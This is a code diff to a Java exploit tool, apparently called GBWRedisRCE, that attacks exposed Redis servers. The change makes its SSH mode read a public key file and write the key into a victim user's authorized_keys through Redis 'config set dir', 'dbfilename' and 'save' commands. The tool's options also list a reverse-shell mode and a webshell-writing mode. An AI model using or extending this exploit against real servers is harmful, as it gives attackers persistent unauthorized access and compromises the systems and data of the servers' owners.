@@ -6,6 +6,7 @@ import org.apache.commons.cli.HelpFormatter;
 import org.apache.commons.cli.Options;
 import redis.clients.jedis.Jedis;
 
+import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
@@ -139,12 +140,14 @@ public class GBWRedisRCE {
     }
 
 
-    private static void runSSHAttack(Jedis jedis,String args){
+    private static void runSSHAttack(Jedis jedis,String args) throws IOException {
 
         String[] kk = args.split(":");
 
         String user = kk[0];
         String key = kk[1];
+
+        String content = new String(Files.readAllBytes(Paths.get(key)));
 
         String authPath = String.format("%s/.ssh/",user);
         String auth = "authorized_keys";
@@ -152,7 +155,7 @@ public class GBWRedisRCE {
 
         prepare(jedis);
         printCmd("config set dir "+authPath,jedis.configSet("dir",authPath));
-        printCmd("set x "+key,jedis.set("x",key));
+        printCmd("set x "+content,jedis.set("x",content));
         printCmd("config set dbfilename "+auth,jedis.configSet("dbfilename",auth));
         printCmd("save",jedis.save());
 
@@ -184,7 +187,7 @@ public class GBWRedisRCE {
 
         opts.addOption("shell",true,"get-shell remote host and port: <host>:<port>");
         opts.addOption("webshell",true,"write webshell attack: <web_dir>:<webshell file path>");
-        opts.addOption("ssh",true,"write public key and remote login:<user>:<key>");
+        opts.addOption("ssh",true,"write public key and remote login:<user>:<key_path>");
 
         opts.addOption("timeout",true,"connect/read timeout");
         opts.addOption("help", false, "Print usage");
